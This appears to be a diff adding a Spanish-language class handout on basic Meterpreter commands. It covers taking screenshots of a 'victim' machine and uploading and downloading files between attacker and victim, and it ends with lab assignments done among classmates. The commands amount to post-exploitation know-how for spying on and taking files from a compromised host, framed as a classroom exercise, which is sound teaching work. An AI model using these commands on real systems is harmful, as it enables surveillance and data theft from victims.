@@ -1,0 +1,27 @@
+1 comandos basicos en el meterpreter de msfconsole, una ves conectado a la maquina:
+2 
+3 1. comando para tomar captura de pantalla actual en la maquina victima:
+4       screenshot
+5 
+6 ejemplo:
+7       screenshot
+8 
+9 comando para subir un archivo desde la maquina atacante hacia la maquina victima:
+10      upload {ruta-completa-con/}[archivo.extension] {ruta-completa-con\\}[archivo.extension]
+11 
+12 ejemplo
+13      upload /home/desktop/kevin.txt c:\\users\\lola\\desktop\\kevin.txt
+14 
+15 comando para descargar un archivo desde la maquina victima hacia la maquina atacante:
+16      download {ruta-completa-con\\}[archivo.extension] {ruta-completa-con/}[archivo.extension]
+17 
+18 ejemplo
+19      download c:\\users\\lola\\desktop\\kevin.txt /home/desktop/kevin.txt
+20 
+21 asignaciones:
+22      1. tomar captura de pantalla de la maquina victima
+23      2. crear un archivo .txt con tu nombre y redactar un mensaje.
+24      3. subir el archivo en el escritorio del usuario lola
+25      4. ver el contenido de la carpeta escritorio en el usuario lola
+26      5. leer un archivo subido por un compañero (el profe te dira cual)
+27      6. descargar un archivo subido por un compañero (el teacher te dira cual)
